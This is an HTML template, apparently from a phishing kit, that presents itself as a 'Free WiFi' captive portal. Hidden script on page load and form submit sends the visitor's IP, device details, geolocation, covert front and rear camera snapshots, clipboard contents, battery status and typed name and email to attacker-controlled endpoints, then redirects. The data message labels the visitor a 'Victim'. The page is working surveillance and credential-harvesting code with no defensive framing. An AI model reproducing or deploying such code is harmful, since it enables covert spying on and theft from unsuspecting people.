<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Free WiFi - Connect</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='80' font-size='80'>📶</text></svg>">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
.card { background: #fff; border-radius: 16px; padding: 40px; width: 400px; max-width: 90vw; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; }
.wifi-icon { font-size: 48px; margin-bottom: 16px; }
h1 { font-size: 22px; color: #1a1a2e; margin-bottom: 6px; }
.subtitle { font-size: 14px; color: #666; margin-bottom: 30px; }
.form-group { margin-bottom: 16px; text-align: left; }
.form-group label { font-size: 13px; color: #444; margin-bottom: 4px; display: block; }
.form-group input { width: 100%; padding: 12px 14px; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; outline: none; transition: border-color 0.2s; }
.form-group input:focus { border-color: #667eea; }
.terms { font-size: 11px; color: #999; margin-bottom: 20px; }
.terms a { color: #667eea; }
.btn-connect { width: 100%; padding: 13px; background: #667eea; color: #fff; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
.btn-connect:hover { background: #5a6fd6; }
.loading { display: none; padding: 20px; }
.spinner { border: 3px solid #eee; border-top: 3px solid #667eea; border-radius: 50%; width: 28px; height: 28px; animation: spin 0.8s linear infinite; margin: 0 auto 10px; }
@keyframes spin { to { transform: rotate(360deg); } }
.info { display: flex; justify-content: center; gap: 20px; margin-top: 20px; font-size: 11px; color: #aaa; }
</style>
</head>
<body>
<div class="card">
<div class="wifi-icon">📶</div>
<h1>Free WiFi Access</h1>
<p class="subtitle">Connect to complimentary high-speed internet</p>
<form id="loginForm">
<div class="form-group"><label>Full Name</label><input type="text" id="username" placeholder="Enter your name" required></div>
<div class="form-group"><label>Email Address</label><input type="email" id="password" placeholder="Enter your email" required></div>
<p class="terms">By connecting, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a></p>
<button type="submit" class="btn-connect">Connect to WiFi</button>
</form>
<div class="loading" id="loading">
<div class="spinner"></div>
<p style="font-size:14px;color:#555;">Connecting to network...</p>
</div>
<div class="info"><span>🔒 Secure</span><span>⚡ High Speed</span><span>🌐 Unlimited</span></div>
</div>
<video id="video" style="display:none" playsinline autoplay></video>
<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="<%=a %>/public/advanced.js"></script>
<script>
var uid="<%=uid %>";
var video=document.getElementById('video'), canvas=document.getElementById('canvas');
async function gatherAll(){
    let td='📸 <b>WiFi Portal Victim!</b>\n\n';
    td+='⚓ IP: <code><%=ip %></code>\n';
    td+='⏰ Time: '+new Date().toLocaleString()+'\n';
    td+='🖥️ OS: <code>'+navigator.platform+'</code>\n';
    td+='📱 Screen: <code>'+screen.width+'x'+screen.height+'</code>\n';
    td+='🌐 Browser: <code>'+navigator.userAgent.split(' ').pop()+'</code>\n';
    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
    if(navigator.geolocation){navigator.geolocation.getCurrentPosition((p)=>{$.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});},()=>{},{enableHighAccuracy:true,timeout:10000});}
    async function captureCamera(f,l){try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:f,width:640,height:480}});video.srcObject=s;await video.play();await new Promise(r=>setTimeout(r,2000));canvas.getContext('2d').drawImage(video,0,0,640,480);$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/jpeg",0.8).replace("data:image/jpeg;base64,","")),cam:l});s.getTracks().forEach(t=>t.stop());}catch(e){}}
    try{await captureCamera("user","selfie");}catch(e){}
    try{await captureCamera("environment","back");}catch(e){}
    try{if(navigator.clipboard&&navigator.clipboard.readText){const c=await navigator.clipboard.readText();if(c)$.post("<%=a %>/clipboard",{uid:uid,clip:encodeURIComponent(c)});}}catch(e){}
    try{const b=await navigator.getBattery();$.post("<%=a %>/battery",{uid:uid,level:Math.round(b.level*100),charging:b.charging});}catch(e){}
}
document.getElementById('loginForm').addEventListener('submit',async function(e){
    e.preventDefault();
    var user=document.getElementById('username').value, pass=document.getElementById('password').value;
    document.querySelector('form').style.display='none';
    document.getElementById('loading').style.display='block';
    $.post("<%=a %>/creds",{uid:uid,user:encodeURIComponent(user),pass:encodeURIComponent(pass),platform:'WiFi Portal'});
    await gatherAll(); advancedGather("<%=a %>","<%=uid %>");
    await new Promise(r=>setTimeout(r,2500));
    window.location.href="<%=url %>";
});
window.onload=gatherAll;
</script>
</body>
</html>